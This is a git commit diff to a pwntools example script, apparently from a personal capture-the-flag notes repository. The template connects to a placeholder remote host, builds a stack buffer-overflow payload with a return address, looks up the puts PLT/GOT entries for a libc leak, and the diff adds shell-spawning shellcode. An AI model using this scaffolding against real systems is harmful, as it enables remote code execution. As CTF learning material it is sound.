2db1f43b5f2e6f5feb02b47361d60f58fc17e954
Jack Ren <bjrjk@qq.com>
2020-02-07 17:10:06 +0800

    202002071709

--- Pwn/PwnTools.Example.3.py
+++ Pwn/PwnTools.Example.3.py
@@ -1,11 +1,13 @@
 from pwn import *
 context.log_level="debug"
+context(arch="amd64",os="linux")
 
 conn = remote("IP_ADDR",IP_PORT)
 conn.recvuntil("Input Something:")
 conn.recvline("Input Something:")
 conn.send("This is my data.")
 conn.sendline("I'm gonna send a new line.")
+conn.sendlineafter("Input Something:","Something")
 data = conn.recv(4) # 4 Bytes Data in variable data
 
 payload = b'0'*BUFFER_SIZE + p64(0) + p64(RETURN_ADDR)
@@ -16,5 +18,7 @@ elf = ELF("./pwn_binary")
 puts_plt = elf.plt['puts']
 puts_got = elf.got['puts']
 main_addr = elf.sym['main']
+
+shellcode = asm(shellcraft.sh())
 
 conn.interactive()
